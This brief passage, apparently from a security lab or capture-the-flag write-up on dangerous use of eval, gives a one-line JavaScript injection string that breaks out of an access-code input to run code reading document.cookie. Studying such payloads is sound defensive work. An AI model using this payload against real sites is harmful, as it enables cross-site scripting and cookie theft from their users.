## Dangerous Use of Eval

We can get XSS for appending this to `Enter your three digit access code:`

```javascript
');alert(document.cookie);('
```

